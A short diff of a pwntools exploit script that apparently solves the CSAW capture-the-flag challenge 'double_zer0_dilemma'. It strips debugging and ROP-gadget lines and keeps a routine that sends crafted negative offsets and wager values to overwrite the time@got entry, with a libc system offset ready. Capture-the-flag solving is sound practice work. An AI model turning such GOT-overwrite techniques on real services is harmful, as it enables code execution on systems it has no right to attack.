@@ -1,21 +1,11 @@
 from pwn import *
-context.binary = exe =ELF('./double_zer0_dilemma',checksec =False)
-def GDB():
-    gdb.attach(p,gdbscript='''
-    b*rng
-    b*0x808A194
-    c
-    ''')
-    input()
-p = process(exe.path)
+context.binary = elf =ELF('./double_zer0_dilemma',checksec =False)
+p = elf.process()
 
 #p = remote("double-zer0.csaw.io",9999)
 def play(offset,data):
     p.sendlineafter(b"will land on: ",f"{offset}".encode())
     p.sendlineafter(b"to wager: ",f"{data}".encode())
-rsp = 0x000000000808a3bd
-rdi = 0x000000000808a3c3
-put_pop_rsp_r13 = -0x37
 system = 0x52290
 #overwrite time@got to play
 play(-22,0x7c890d6)
